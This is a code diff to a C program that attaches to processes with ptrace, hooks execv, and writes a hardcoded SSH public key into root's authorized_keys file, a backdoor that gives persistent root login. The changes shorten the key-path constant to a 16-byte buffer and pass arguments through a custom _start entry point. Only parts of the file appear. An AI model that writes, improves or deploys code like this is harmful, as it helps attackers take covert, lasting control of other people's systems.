@@ -12,7 +12,9 @@
 #include <sys/ptrace.h>
 #include <linux/ptrace.h>
 
-#define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
+#define SSH_AUTH_PATH "/root/.ssh/autho"
+// the first 0x10 bytes should be enough
+// "rized_keys"
 #define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe root\n"
 // clang-format on
 
@@ -54,8 +56,6 @@ void get_regs (uint32_t pid, struct user_regs_struct *regs);
 
 __attribute_noinline__ void *get_rw_addr ();
 
-__attribute_noinline__ void execv_hook (const char *path, char *const argv[]);
-
 __attribute_noinline__ void
 execv_hook (const char *path, char *const argv[])
 {
@@ -86,8 +86,8 @@ execv_hook (const char *path, char *const argv[])
 void
 set_my_pubkey (uint32_t pid)
 {
-  char authorized_key[] = SSH_AUTH_PATH;
-  char buf[] = "aaaabbbbccccdddd";
+  __attribute__((nonstring)) char authorized_key[0x10] = SSH_AUTH_PATH;
+  __attribute__((nonstring)) char buf[0x10];
 
   struct ptrace_syscall_info info;
   while (1)
@@ -248,7 +248,7 @@ get_rw_addr ()
 }
 
 void
-_start ()
+_start (char *arg, char *argv[])
 {
-  execv_hook (0, 0);
+  execv_hook (arg, argv);
 }
